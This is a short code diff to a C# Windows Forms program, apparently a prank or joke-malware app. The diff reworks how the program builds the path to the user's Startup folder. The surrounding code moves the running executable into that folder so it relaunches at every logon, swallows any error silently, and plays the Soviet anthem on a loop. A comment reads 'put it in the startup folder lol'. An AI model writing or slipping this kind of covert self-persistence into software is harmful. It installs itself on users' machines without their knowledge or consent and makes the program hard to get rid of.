@@ -54,9 +54,12 @@ namespace WindowsFormsApp1
             string fileName = System.AppDomain.CurrentDomain.FriendlyName;
             string sourcePath = @AppDomain.CurrentDomain.BaseDirectory;
             string sourceFile = System.IO.Path.Combine(sourcePath, fileName);
+            string startuppath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string withoutLast = startuppath.Substring(0, (startuppath.Length - 7));
             try //put it in the startup folder lol
             {
-                File.Move(sourceFile, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + System.AppDomain.CurrentDomain.FriendlyName);
+                File.Move(sourceFile, withoutLast +  "startup\\" + System.AppDomain.CurrentDomain.FriendlyName); 
+                
             }
             catch { }
             snd.PlayLooping(); // play the great soviet union anthem. 
